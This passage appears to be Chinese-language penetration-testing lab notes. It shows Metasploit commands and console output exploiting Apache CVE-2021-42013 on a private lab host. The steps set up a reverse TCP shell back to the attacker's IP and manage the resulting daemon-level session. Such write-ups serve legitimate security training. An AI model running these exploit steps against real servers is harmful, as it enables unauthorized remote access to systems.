`RPORT（目標端口）`：預設為 443（HTTPS），但我們需要設定為 80（HTTP）\
`LHOST（攻擊者 IP）`：需要設定為自己的機器

```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.226.16
msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.45.230
```
#### 3. 執行 Exploit 並獲取存取權限

```
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.45.230:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.226.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.226.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.226.16:80 - Sending linux/x64/shell_reverse_tcp command payload
[*] Command shell session 1 opened (192.168.45.230:4444 -> 192.168.226.16:34948) at 2025-03-06 15:15:49 -0500
[!] This exploit may require manual cleanup of '/tmp/RireZM' on the target

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```
> 成功以低權限 daemon 存取該系統

#### - 管理與回到 Session
`Ctrl + X` 可以將當前 session 移至背景執行\
使用 `sessions -l` 查看所有 active session，並用 `sessions -i {index}` 回到 session
```
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x64/linux               192.168.45.230:4444 -> 192.168.226.16:34948 (192.168.226.16)

msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 1
[*] Starting interaction with 1...

```

## Using Metasploit Payloads
